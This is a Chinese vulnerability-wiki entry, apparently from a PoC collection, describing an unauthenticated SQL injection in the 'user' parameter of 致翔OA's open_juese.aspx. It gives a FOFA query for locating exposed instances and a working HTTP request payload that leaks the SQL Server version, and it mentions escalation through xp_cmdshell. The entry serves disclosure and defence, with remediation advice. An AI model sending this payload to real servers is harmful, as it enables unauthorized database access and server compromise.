---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "致翔OA open_juese.aspx user参数SQL注入"
product: "致翔OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；SQL Server错误转换@@VERSION"
prerequisites: "声称未认证"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%20open_juese.aspx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"致翔软件-致翔OA\""
id: "vw-cb1cb0d5ac98de9638e118c3"
entity_id: "ve-cb1cb0d5ac98de9638e118c3"
schema_version: "1"
---

# 致翔OA open_juese.aspx user参数SQL注入

## 条目说明

- 对象与具体问题：致翔OA；open_juese.aspx user参数SQL注入
- 版本、配置及部署条件：无版本；SQL Server错误转换@@VERSION
- 认证与权限前提：声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与致翔软件致翔OA-open_juese篇同接口参数，版本信息查询与当前用户查询可合并为变体
- xp_cmdshell/RCE没有样本支持且依权限/配置，应条件化
- 在野利用无来源，HTTP无围栏，结果仅截图

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

致翔OA open_juese.aspx 接口存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## 影响版本

致翔OA

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="致翔软件-致翔OA"

POC/EXP：

```http
GET /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=@@VERSION--+&requeststr= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


![image-20241125181639300](./.resource/致翔OAopen_juese.aspxSQL注入漏洞/media/image-20241125181639300.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
